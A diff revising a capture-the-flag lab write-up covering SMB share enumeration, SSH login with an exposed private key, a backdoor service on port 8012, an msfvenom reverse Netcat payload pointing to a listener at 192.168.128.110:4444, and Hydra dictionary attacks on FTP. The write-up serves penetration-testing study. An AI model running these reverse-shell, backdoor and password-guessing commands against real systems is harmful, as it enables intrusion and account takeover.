@@ -4,7 +4,7 @@ Note: All target IP addresses in this write-up are shown as `<IP_ADDRESS>`, beca
 
 ## 1. Port Scanning
 
-I used Nmap with `-Pn` to identify open ports on the lab target. The `-Pn` option skips host discovery and treats the target as online.
+I used Nmap with `-Pn` to identify open ports on the SMB lab target. The `-Pn` option skips host discovery and treats the target as online.
 
 ### Command Used
 
@@ -31,7 +31,7 @@ I found ports `139` and `445` interesting because they are associated with SMB. 
 
 ### Note on Non-Standard Ports
 
-A scan that does not cover the full port range will not show services running on non-standard ports. Services can run on ports other than their usual ones, so a port that is not scanned can hide a service entirely. This is a reason to scan fully rather than relying only on a default port list.
+A scan that does not cover the full port range can miss services running on non-standard ports. Services can run on ports other than their usual ones, so a port that is not scanned can hide a service entirely. This is a reason to scan fully rather than relying only on a default port list.
 
 ## 2. Service Enumeration
 
@@ -152,13 +152,13 @@ The listing shows a user-like home directory, including hidden files and directo
 From the `profiles` share, I downloaded the file `Working From Home Information.txt` to my local machine:
 
 ```text
-smb: \> get "working From Home Information.txt"
+smb: \> get "Working From Home Information.txt"
 ```
 
 I then read the downloaded file locally:
 
 ```bash
-cat working\ From\ Home\ Information.txt
+cat "Working From Home Information.txt"
 ```
 
 ### Findings
@@ -189,7 +189,7 @@ I then used that private key as the SSH identity to log in as user `cactus`:
 ssh -i id_rsa cactus@<IP_ADDRESS>
 ```
 
-This worked because the private key matched the account's SSH authentication, turning the anonymous SMB access into authenticated SSH access. Note that this was a private key, not a password hash.
+This indicates that the SSH server accepted authentication using the supplied private key for the `cactus` account, turning access to the exposed SMB share into authenticated SSH access. Note that this was a private key, not a password hash.
 
 After logging in, I found and read `smb.txt` in the account's home directory:
 
@@ -200,6 +200,8 @@ cactus@POLOSMB:~$ cat smb.txt
 That file contained the SMB flag. The flag value is intentionally omitted from this write-up.
 
 ## 4. Full Port Scan and Telnet Backdoor
+
+Telnet is a remote-terminal protocol commonly associated with TCP port 23. In this lab, a Telnet client was used to connect to a custom command service on a non-standard port; the banner did not establish that the service was a standard Telnet daemon.
 
 This step puts the earlier note on non-standard ports into practice: a full scan found a service that a default scan would not necessarily surface.
 
@@ -218,7 +220,7 @@ PORT     STATE SERVICE
 8012/tcp open  unknown
 ```
 
-Only one open port was found, `8012/tcp`, and Nmap labeled its service as `unknown`. That label does not identify the service; it only means Nmap did not recognize it from the port number, which fits a non-standard port.
+Only one open TCP port was found on this lab target, `8012/tcp`, and Nmap labeled its service as `unknown`. That label does not identify the service; it only means Nmap did not recognize it from the port number, which fits a non-standard port.
 
 ### Connecting with Telnet
 
@@ -239,7 +241,7 @@ The banner identified the service on port `8012` as SKIDY'S BACKDOOR, and pointe
 
 ## 5. Verifying Backdoor Access with tcpdump and ICMP
 
-To test whether the Telnet backdoor was actually usable, I ran a tcpdump listener and used the backdoor's `.RUN` command to make the target send ICMP traffic back to my listener. If the listener captured that traffic, it would confirm the backdoor could execute commands and reach my machine.
+To test whether the backdoor could execute system commands, I used its `.RUN` command to make the target ping my Kali VPN address. I captured the resulting ICMP traffic using `tcpdump` on Kali. `tcpdump` is a packet-capture tool, not a reverse-shell listener.
 
 ### Backdoor Commands
 
@@ -270,7 +272,7 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 
 ### Interpretation
 
-The listener captured an ICMP echo request from the target to `192.168.128.110`, followed by an ICMP echo reply back to the target. That round trip confirmed the target could hear and respond to my machine through the backdoor path: the backdoor was not just a banner, it could execute a command and produce network traffic back to the listener.
+The capture showed an ICMP echo request from the target to `192.168.128.110`, followed by a reply from Kali. This supports that the `.RUN` command executed and that ICMP connectivity existed between the target and Kali. ICMP success alone does not establish an interactive shell; the separate reverse-shell connection is documented in Section 6.
 
 
 ## 6. Reverse Shell via the Telnet Backdoor
@@ -291,7 +293,7 @@ listening on [any] 4444 ...
 
 ### Generating the Payload with msfvenom
 
-I used msfvenom to generate a reverse Netcat command pointing back to my listener address `192.168.128.110` on port `4444`:
+I used msfvenom to generate a reverse Netcat command pointing back to my listener address `192.168.128.110` on port `4444`. The command below is preserved as recorded during the lab; the trailing `R` should be checked against the original terminal history before treating it as part of a reusable command:
 
 ```bash
 msfvenom -p cmd/unix/reverse_netcat lhost=192.168.128.110 lport=4444 R
@@ -343,7 +345,7 @@ FTP is another protocol where the direction of the data connection matters, and 
 - **Active FTP resembles a reverse shell**: the server initiates the data connection back to the client.
 - **Passive FTP resembles a bind shell**: the client initiates the data connection to the server.
 
-In both cases, the key distinction is who initiates the data connection, not just who starts the session.
+In both cases, the key distinction is who initiates the data connection, not just who starts the session. Both FTP modes use a client-initiated control connection, typically on TCP port 21. In the FTP transcript below, `229 Entering Extended Passive Mode` shows that the server offered a passive data connection.
 
 The FTP step from this lab is recorded in Section 8.
 
@@ -449,7 +451,7 @@ The notice was signed by Mike, giving a person's name associated with the FTP se
 
 ## 9. Security Note: FTP and Telnet Are Unencrypted
 
-Both FTP and Telnet send their commands, channels, and communications unencrypted. That means the traffic is in plaintext, not protected by encryption.
+Traditional FTP and Telnet do not encrypt their traffic by default. FTP credentials and file data, as well as Telnet terminal traffic, can therefore be exposed to a party able to observe the network path. This does not describe encrypted variants such as FTPS, nor the separate SFTP protocol.
 
 As a result, an attacker in a man-in-the-middle position on the network path could see everything passing over those connections, including commands and transferred data.
 
@@ -457,7 +459,7 @@ This is a general security property of these protocols, not a man-in-the-middle 
 
 ## 10. Cracking Mike's FTP Password with Hydra and Retrieving ftp.txt
 
-The name Mike from `PUBLIC_NOTICE.txt` gave a username to try against the FTP service.
+The name Mike from `PUBLIC_NOTICE.txt` suggested `mike` as a potential FTP username. The notice alone did not prove this username existed.
 
 ### Password Cracking with Hydra
 
@@ -476,9 +478,7 @@ Hydra v9.6 starting at 2026-10-28 19:54:01
 Hydra finished at 2026-10-28 19:54:16
 ```
 
-Hydra found a valid password very quickly, within about 15 seconds. The password value itself is intentionally omitted from this write-up, following the rule not to record passwords.
-
-This worked because the account used a weak password that appeared early in the wordlist, so online guessing succeeded without needing a long brute-force run.
+Hydra reported one valid password for the `mike` FTP account in approximately 15 seconds. The password value itself is intentionally omitted from this write-up. The later successful FTP login independently verified that the credential worked. This demonstrates susceptibility to dictionary-based online password guessing; the recorded output does not establish where the password appeared in the wordlist.
 
 ### Logging in as Mike
 
